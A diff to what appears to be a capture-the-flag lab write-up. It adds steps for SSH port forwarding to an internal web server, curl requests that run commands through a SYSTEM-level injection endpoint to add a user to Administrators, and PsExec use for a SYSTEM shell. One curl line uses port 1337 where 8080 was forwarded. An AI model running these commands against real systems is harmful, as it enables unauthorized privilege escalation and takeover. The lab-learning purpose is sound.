@@ -94,7 +94,7 @@ Let's change the IP to the target's and try again:
 
 POST Request:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### SSH Enumeration
 
@@ -172,6 +172,55 @@ ariah4168        (Infrastructure.pdf)
 
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-### PrivEsc vector
+### Network Enumeration
+
+* We can see that there is an internal web server running on port 80
+* Let's use SSH to port forward it so we can access it on Kali
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### SSH Portforward
+
+```
+ssh -f -N -L <kali-bind-ip>:<kali-tcp-port>:<target-side-ip>:<target-tcp-port> username@target-ip
+
+ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.81.99
+```
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* If we refer back to the pdf, there is a command injection endpoint at the root level
+
+```
+curl 'http://localhost:8080/?whoami'
+
+nt authority\system
+```
+
+* Wow, the web server is running as SYSTEM
+
+Add user ariah to the Administrator group:
+
+```
+curl 'http://localhost:1337/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'
+```
+
+Add psexec to the target with SCP:
+
+{% embed url="https://download.sysinternals.com/files/PSTools.zip" %}
+
+On Kali:
+
+```
+scp PsExec64.exe ariah@192.168.81.99:C:/ftp/
+```
+
+On Windows Target:
+
+```
+PsExec64.exe -accepteula -s cmd.exe
+```
 
 ## Proof
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
